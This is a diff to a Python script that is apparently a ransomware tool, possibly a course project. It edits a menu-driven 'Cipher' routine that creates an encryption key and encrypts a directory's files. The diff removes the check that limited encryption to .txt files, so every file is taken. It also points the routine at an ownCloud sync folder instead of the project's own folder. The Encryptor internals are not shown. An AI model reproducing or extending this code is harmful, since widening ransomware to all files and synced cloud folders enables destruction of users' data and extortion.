@@ -17,7 +17,8 @@ def dir_txt_files(dir_name):
         '''for all files in the directory given'''
         dirfile = os.path.join(dir_name, file)
         '''creates a full file name including path for each file in the directory'''
-        if os.path.isfile(dirfile) and os.path.splitext(dirfile)[1][1:] == 'txt':
+        # if os.path.isfile(dirfile) and os.path.splitext(dirfile)[1][1:] == 'txt':
+        if os.path.isfile(dirfile):
             '''if the full file name above is a file and it ends in 'txt' it will be added to the list 
             created above '''
             fileList.append(dirfile)
@@ -43,7 +44,6 @@ def check_dir(path, directory="testdir"):
 
 
 def main():
-
     while True:
         op = pyip.inputMenu(['New dir', 'Cipher', 'Delete', 'Exit'], "Option->\n", numbered=True, limit=3)
 
@@ -63,7 +63,7 @@ def main():
             print("Dir '" + dirname + "' deleted")
 
         elif op == 'Cipher':
-            os.chdir("/home/pedralmeida/Documents/tpr_ransomware")
+            os.chdir("/home/pedralmeida/Documents/owncloud/")
 
             encryptor = Encryptor()
             mykey = encryptor.key_create()
